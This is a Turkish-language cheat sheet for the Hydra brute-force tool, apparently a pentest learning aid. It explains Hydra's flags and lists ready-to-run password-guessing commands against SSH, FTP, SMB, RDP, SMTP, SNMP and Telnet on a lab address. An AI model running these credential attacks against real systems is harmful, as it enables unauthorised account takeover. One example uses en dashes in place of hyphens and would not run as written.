# HydraCheatSheet-TR
Hedef IP adresimizin 10.0.2.15 Olduğunu varsayalım

# Parametreler

| Parametre | Örnek Kullanım |
|-------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------|
| hydra -l : Kullanıcı adını bildiğimiz kısımlarda bu parametreyi kullanırız kullanıcı adını elimizle girmemizi sağlar                                                                                                    | hydra -l admin                              |
| hydra -L : Kullanıcı adlarının bulunduğu wordlist'i girmemizi sağlar                                                                       | hydra -L /home/kali/Desktop/users.txt       |
| hydra -P : Şifrelerin bulunduğu wordlist'i girmemizi sağlar                                                                              | hydra -P /usr/share/wordlists/rockyou.txt      |
| hydra -V : Denenen kullanıcı adı ve şifrelerin terminalden kamasını sağlar                                                                         | hydra -l admin -P /usr/share/wordlist/rockyou.txt 10.0.2.15 ssh -V |
| hydra -f : Kullanıcı adı ve parola uyuşuyorsa saldırıyı durdurup size bulunan sonucu gösterir                                                                                         |   hydra -L usernames.txt -P passwords.txt 10.0.2.15 smb -V -f        |
| hydra -t 4 : Aynı anda kaç tane deneme yapılacağını belirtmek için kullanılır                                                                         |  hydra -l administrator -P /usr/share/wordlists/rockyou.txt 10.0.2.15 smb -t 4 -f -V                               |
| hydra -s : Salddıracağımız port normalden farklı bir port numarasında çalşışıyorsa bu parametre o port numarasını vermemizi sağlar                                                                                         | hydra -L usernames.txt -P passwords.txt 10.0.2.15 smb -s 50 -V -f                              |
| hydra -R : Eğer ki Hydra saldırı yaparken Ctrl+c Tuş kombinasyonunu kullanıp işlem durdurulmuşsa, işlemi devam ettirmek için -R Pprametresini kullanırız                                                                               | hydra -R    |
| hydra -o : xml, txt formatında çıktı almak için kullanılır                                                                                |Hydra –l msfadmin –o ~/ilk.xml –P pass.txt  ftp://10.0.2.15 |

# Örnek Saldırı Komutları

| Komut | Tanım |
|-------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------|
| hydra -P password-file.txt -v 10.0.2.15 snmp                                                                                                    | SNMP portuna saldırır                      |
| hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -V 10.0.2.15 ftp                                                                       | FTP portuna saldırır       |
| hydra -l root -P passwords.txt -f ssh://10.0.2.15 -V                                                                               |   SSH portuna saldırır         |
| hydra -L users.txt -P /home/kali/passwords.txt 10.0.2.15 smtp -V -f                                                                         | SMTP Portuna saldırır |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.0.2.15                                                           | RDP Portuna saldırır     |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt 10.0.2.15 smb                                                             | SMB Portuna saldırır             |
| hydra -l root -P passwords.txt 10.0.2.15 telnet | Telnet portuna saldırır |
